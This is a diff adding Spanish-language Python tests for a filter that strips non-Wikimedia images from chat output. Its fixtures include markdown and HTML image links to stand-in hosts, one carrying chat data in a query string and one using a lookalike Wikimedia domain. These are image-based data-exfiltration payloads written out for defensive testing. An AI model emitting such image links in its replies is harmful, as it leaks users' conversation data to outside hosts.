@@ -109,3 +109,33 @@ def test_el_prompt_lo_pide_solo_cuando_toca():
 def test_la_voz_dice_esquema_no_codigo():
     voz = speakable_text(_con(FLUJO))
     assert AVISO_ESQUEMA in voz and "flowchart" not in voz and "código" not in voz
+
+
+# --- Imágenes ajenas (defensa en profundidad, auditoría de la #80) -------------------
+
+from src.domain.services.visuals import strip_foreign_images  # noqa: E402
+
+
+@pytest.mark.parametrize(
+    "texto",
+    [
+        "Mira ![gráfico](https://otro.example/p.png?d=datos-del-chat) aquí",
+        'Mira ![gráfico](<https://otro.example/p.png> "título") aquí',
+        "Mira ![gráfico][ref] aquí\n\n[ref]: https://otro.example/p.png",
+        'Mira <img src="https://otro.example/p.png?d=x"> aquí',
+        "Mira ![gráfico](//otro.example/p.png) aquí",
+        "Mira ![gráfico](https://upload.wikimedia.org.evil.example/p.png) aquí",
+    ],
+)
+def test_una_imagen_que_no_es_de_wikimedia_no_llega(texto):
+    limpio = strip_foreign_images(texto)
+    assert "otro.example/p.png?" not in limpio.split("[ref]:")[0] and "<img" not in limpio
+    assert "evil.example" not in limpio.split("\n")[0]
+    assert "[Imagen:" in limpio
+
+
+def test_la_foto_de_wikimedia_y_los_enlaces_se_quedan():
+    foto = "![Volcán](https://upload.wikimedia.org/wikipedia/commons/a/ab/V.jpg)"
+    miniatura = "![Volcán](https://thumb.wikimedia.org/wikipedia/commons/thumb/a/ab/V.jpg/640px-V.jpg)"
+    enlace = "[Khan Academy](https://es.khanacademy.org/math)"
+    assert strip_foreign_images(f"{foto}\n{miniatura}\n{enlace}") == f"{foto}\n{miniatura}\n{enlace}"
